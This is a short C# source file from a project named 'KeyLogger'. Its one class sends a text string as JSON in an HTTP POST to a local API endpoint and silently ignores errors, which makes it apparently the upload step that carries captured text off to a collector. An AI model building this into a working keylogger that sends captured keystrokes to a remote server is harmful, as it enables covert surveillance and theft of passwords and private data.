using Newtonsoft.Json;
using System.Net.Http;
using System.Text;
using System.Threading.Tasks;

namespace KeyLogger
{
    public class ServiceHTTP
    {
        public async static Task<bool> SendDataAsync(string text)
        {
            try
            {
                HttpClient httpClient = new HttpClient();
                httpClient.DefaultRequestHeaders.Add("X-ORIGIN", "APP1");
                var response = await httpClient.PostAsync("http://localhost:35164/api/", new StringContent(JsonConvert.SerializeObject(text), Encoding.UTF8, "application/json"));

                return response.IsSuccessStatusCode;
            }
            catch
            {}

            return false;
        }
    }
}
